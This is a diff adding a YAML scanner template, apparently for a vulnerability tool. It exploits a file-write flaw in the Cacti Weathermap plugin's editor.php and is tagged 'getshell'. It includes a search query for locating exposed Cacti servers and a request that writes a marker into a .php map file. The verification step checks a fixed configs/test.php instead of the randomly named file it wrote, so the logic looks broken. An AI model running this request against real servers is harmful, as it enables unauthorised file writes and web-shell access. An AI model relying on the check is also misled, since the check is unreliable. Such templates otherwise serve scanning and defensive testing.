@@ -1,0 +1,24 @@
+name: Cacti Weathermap File Write
+manual: true
+query: app="cacti-监控系统" || title="Login to Cacti" || app="Cactiez"
+transport: http
+set:
+  str1: randomLowercase(7)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /plugins/weathermap/editor.php?plug=0&mapname={{str1}}.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /plugins/weathermap/configs/test.php
+    expression: response.status == 200 && response.body.bcontains(b"46ea1712d4b13b55b3f680cc5b8b54e8")
+expression: r0() && r1()
+detail:
+  description: Cacti provides a robust and extensible operational monitoring and fault
+    management framework for users around the world. Is also a complete network graphing
+    solution designed to harness the power of RRDTool's data storage and graphing
+    functionality.
+  tags: getshell
